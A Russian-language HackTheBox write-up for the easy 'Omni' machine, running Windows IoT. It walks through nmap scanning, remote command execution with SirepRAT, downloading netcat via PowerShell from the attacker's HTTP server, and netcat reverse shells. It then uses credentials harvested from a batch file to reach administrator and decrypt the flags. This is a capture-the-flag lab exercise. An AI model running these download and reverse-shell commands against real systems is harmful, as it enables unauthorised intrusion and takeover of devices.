# Omni
## HTB machine

- Название: Omni        
- OS: Other
- Ресурс: HackTheBox
- Сложность: Easy
- Дата релиза: 22.08.20

## Write-up

```html
user@kali:~/Downloads$ sudo nmap -sV -A 10.10.10.204                           
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 07:24 EDT                 
Nmap scan report for 10.10.10.204                                               
Host is up (0.10s latency).                                                     
Not shown: 998 filtered ports                                                   
PORT     STATE SERVICE VERSION
135/tcp  open  msrpc   Microsoft Windows RPC
8080/tcp open  upnp    Microsoft IIS httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (86%)
OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   104.73 ms 10.10.14.1
2   104.93 ms 10.10.10.204

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.74 seconds
```

> https://github.com/SafeBreach-Labs/SirepRAT

```html
user@kali:~/Downloads/SirepRAT-master$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\hostname.exe"
HResultResult | type: 1, payload length: 4, HResult: 0x0>
OutputStreamResult | type: 11, payload length: 6, payload peek: 'omni'>
```

>Скачиваем -- https://eternallybored.org/misc/netcat/ и открываем simple http server

```html
user@kali:~/Downloads/netcat-1.11$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

>Делаем запрос на файл:

```html
user@kali:~/Downloads/SirepRAT-master$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://10.10.14.58:8000/nc64.exe" --v
HResultResult | type: 1, payload length: 4, HResult: 0x0>
ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>

user@kali:~/Downloads/netcat-1.11$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.204 - - [22/Sep/2020 08:31:24] "GET /nc64.exe HTTP/1.1" 200 -
```

>Запускаем netcat:

```html
user@kali:~$ nc -lnvp 4444
listening on [any] 4444 ...

user@kali:~/Downloads/SirepRAT-master$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\Windows\System32\spool\drivers\color\nc64.exe 10.10.14.58 4444 -e powershell.exe" --v
HResultResult | type: 1, payload length: 4, HResult: 0x0>
```

>И перехватываем:

```html 
user@kali:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.58] from (UNKNOWN) [10.10.10.204] 49678
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32>
```

>Переходим в директорию:

```html
PS C:\windows\system32> cd "c:\Program Files\WindowsPowershell\Modules\PackageManagement"
cd "c:\Program Files\WindowsPowershell\Modules\PackageManagement"

PS C:\Program Files\WindowsPowershell\Modules\PackageManagement> cat r.bat
cat r.bat
@echo off

:LOOP

for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete

net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz

ping -n 3 127.0.0.1

cls

GOTO :LOOP

:EXIT
```

>app и mesh5143 это креды для входа в панель на порту 8080, логинимся и переходим в Processes > Run Command, заранее запускаем netcat:

```html
C:\Windows\System32\spool\drivers\color\nc64.exe 10.10.14.58 1234 -e powershell.exe
```

>Теперь у нас есть юзер "app", можем взять первый флаг:

```html
PS C:\Data\Users\app> cat user.txt
cat user.txt
Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  Obj RefId="0">
    TN RefId="0">
      T>System.Management.Automation.PSCredential/T>
      T>System.Object</T>
    /TN>
    ToString>System.Management.Automation.PSCredential/ToString>
    Props>
      S N="UserName">flag/S>
      SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7/SS>
    /Props>
  /Obj>
/Objs>
```

>Расшифруем:

```html
PS C:\Data\Users\app> $credential = Import-CliXml -Path U:\Users\app\user.txt
$credential = Import-CliXml -Path U:\Users\app\user.txt
PS C:\Data\Users\app> $credential.GetNetworkCredential().Password
$credential.GetNetworkCredential().Password
7cfd50f6bc34db3204898f**********
```

>Теперь, чтобы получить root, нужно заново войти в панель с кредами administrator:_1nt3rn37ofTh1nGz и так же получить оболочку через netcat:

```html
C:\Windows\System32\spool\drivers\color\nc64.exe 10.10.14.58 1235 -e powershell.exe

user@kali:~$ nc -lnvp 1235
listening on [any] 1235 ...
connect to [10.10.14.58] from (UNKNOWN) [10.10.10.204] 49680
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32> $env:UserName
$env:UserName
Administrator
```

>И берем последний флаг:

```html
PS C:\> $credential = Import-CliXml -Path U:\Users\administrator\root.txt
$credential = Import-CliXml -Path U:\Users\administrator\root.txt
PS C:\> $credential.GetNetworkCredential().Password
$credential.GetNetworkCredential().Password
5dbdce5569e2c4708617c0**********
```

